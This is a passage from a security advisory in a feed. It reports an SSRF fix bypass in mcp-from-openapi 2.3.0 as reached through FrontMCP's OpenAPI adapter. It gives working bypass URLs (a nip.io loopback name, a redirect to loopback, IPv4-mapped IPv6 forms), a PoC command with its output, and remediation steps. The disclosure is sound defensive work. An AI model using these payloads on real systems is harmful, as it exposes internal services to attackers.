<p>FrontMCP's OpenAPI adapter reaches the affected dependency paths:</p>
<ul>
<li><code>libs/adapters/src/openapi/openapi.adapter.ts</code> imports <code>OpenAPIToolGenerator</code> from <code>mcp-from-openapi</code>.</li>
<li><code>loadOpenAPISpec()</code> calls <code>OpenAPIToolGenerator.fromURL(this.options.url, ...)</code> and forwards <code>loadOptions.refResolution</code>.</li>
<li>The same method calls <code>OpenAPIToolGenerator.fromJSON(this.options.spec, ...)</code> and forwards <code>loadOptions.refResolution</code>.</li>
</ul>
<p>In <code>mcp-from-openapi</code> 2.3.0, the patched guard is applied before the HTTP resolver fetches an external <code>$ref</code>. It checks the parsed URL hostname string against deny patterns for direct local and private addresses. The resolver does not resolve hostnames before allow or deny decisions, does not pin the validated IP to the fetch, and does not revalidate redirect targets before following them. It also misses IPv4-mapped IPv6 loopback forms.</p>
<p>As a result, these URLs are accepted by the guard but cause a loopback request from the backend:</p>
<ul>
<li><code>http://127.0.0.1.nip.io:&lt;port&gt;/schema.json</code>, because the hostname string is not a direct IP even though it resolves to 127.0.0.1.</li>
<li><code>http://127.0.0.1.nip.io:&lt;port&gt;/redirect</code>, because the first host passes and the actual request follows a redirect to <code>http://127.0.0.1:&lt;port&gt;/schema.json</code>.</li>
<li><code>http://[::ffff:127.0.0.1]:&lt;port&gt;/schema.json</code> and <code>http://[::ffff:7f00:1]:&lt;port&gt;/schema.json</code>, because IPv4-mapped IPv6 loopback is not normalized and denied.</li>
</ul>
<p><code>OpenAPIToolGenerator.fromURL()</code> is also still unguarded for the initial OpenAPI spec URL. The PoC includes that as supporting evidence, but the primary report is the external <code>$ref</code> fix bypass.</p>
<h2 id="reproduction">Reproduction</h2>
<p>The attached local PoC starts a loopback canary and loads generated OpenAPI specs using <code>mcp-from-openapi</code> 2.3.0. The request body schema contains a single external <code>$ref</code> for each test case. The canary records every backend-origin request.</p>
<p>Run:</p>
<pre><code class="language-bash">cd /home/unkn0wn/security_audit/frontmcp-ssrf-poc
node repro-frontmcp-latest-ssrf-bypasses.mjs
</code></pre>
<p>Important output from a fresh run on 2026-05-25:</p>
<pre><code class="language-json">{"name":"direct-127-denied-control","kind":"external_ref","refUrl":"http://127.0.0.1:45117/schema.json","ok":false,"hitCount":0,"hits":[]}
{"name":"dns-name-to-127-bypass","kind":"external_ref","refUrl":"http://127.0.0.1.nip.io:45117/schema.json","ok":true,"hitCount":1,"hits":[{"url":"/schema.json","host":"127.0.0.1.nip.io:45117","authorization":null}]}
{"name":"dns-name-to-127-bypass-with-allowedHosts","kind":"external_ref","refUrl":"http://127.0.0.1.nip.io:45117/schema.json","ok":true,"hitCount":1,"hits":[{"url":"/schema.json","host":"127.0.0.1.nip.io:45117","authorization":null}]}
{"name":"redirect-to-127-after-allowed-host","kind":"external_ref","refUrl":"http://127.0.0.1.nip.io:45117/redirect","ok":true,"hitCount":2,"hits":[{"url":"/redirect","host":"127.0.0.1.nip.io:45117","authorization":null},{"url":"/schema.json","host":"127.0.0.1:45117","authorization":null}]}
{"name":"ipv4-mapped-ipv6-dotted-bypass","kind":"external_ref","refUrl":"http://[::ffff:127.0.0.1]:45117/schema.json","ok":true,"hitCount":1,"hits":[{"url":"/schema.json","host":"[::ffff:7f00:1]:45117","authorization":null}]}
{"name":"ipv4-mapped-ipv6-hex-bypass","kind":"external_ref","refUrl":"http://[::ffff:7f00:1]:45117/schema.json","ok":true,"hitCount":1,"hits":[{"url":"/schema.json","host":"[::ffff:7f00:1]:45117","authorization":null}]}
{"name":"external-refs-disabled-control","kind":"external_ref","refUrl":"http://127.0.0.1.nip.io:45117/schema.json","ok":true,"hitCount":0,"hits":[]}
</code></pre>
<p>Controls:</p>
<ol>
<li>Direct loopback <code>$ref</code> is denied and the canary records zero requests.</li>
<li>Numeric IPv4 variants tested as parser controls were denied with zero requests.</li>
<li>Default <code>file://</code> resolution was denied in this runtime.</li>
<li>Setting <code>refResolution.allowedProtocols: []</code> prevents the external request, but this is not the default.</li>
</ol>
<h2 id="impact">Impact</h2>
<p>The previous advisory documented SSRF during untrusted OpenAPI <code>$ref</code> dereferencing. The latest patched version still lets an attacker trigger backend-origin requests to loopback or private network services through equivalent URL forms. In hosted or multi-user FrontMCP deployments where users can import or configure OpenAPI specs, this can expose internal admin APIs, metadata-like services, and other network endpoints that external users cannot reach directly.</p>
<p>The impact depends on whether a deployment treats OpenAPI adapter configuration as trusted administrator-only input. If untrusted authenticated users can import specs, this is a high-impact SSRF fix bypass. If only a local administrator can configure OpenAPI specs, the practical severity is lower.</p>
<h2 id="remediation">Remediation</h2>
<ol>
<li>Do not rely on parsed hostname denylist checks for external <code>$ref</code> URLs.</li>
<li>Resolve hostnames before the request and reject loopback, private, link-local, multicast, unspecified, and metadata ranges.</li>
<li>Normalize IPv4-mapped IPv6 before range checks.</li>
<li>Revalidate every redirect target before following it, or disable redirects during external <code>$ref</code> dereferencing.</li>
<li>Pin the validated IP to the actual request with a custom dispatcher, lookup hook, or equivalent connect-time control.</li>
<li>Apply the same protected client to <code>fromURL()</code> initial spec loads.</li>
<li>Consider disabling external refs by default for untrusted OpenAPI specs and requiring explicit allowlists.</li>
<li>Add regression tests for direct loopback, DNS-to-loopback, redirect-to-loopback, IPv4-mapped IPv6, numeric IP forms, file refs, and disabled external refs.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/agentfront/frontmcp/security/advisories/GHSA-65h7-9wrw-629c">https://github.com/agentfront/frontmcp/security/advisories/GHSA-65h7-9wrw-629c</a></li>
<li><a href="https://github.com/advisories/GHSA-65h7-9wrw-629c">https://github.com/advisories/GHSA-65h7-9wrw-629c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-65h7-9wrw-629c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-11T22:02:04.000Z</published>
    </entry>
</feed>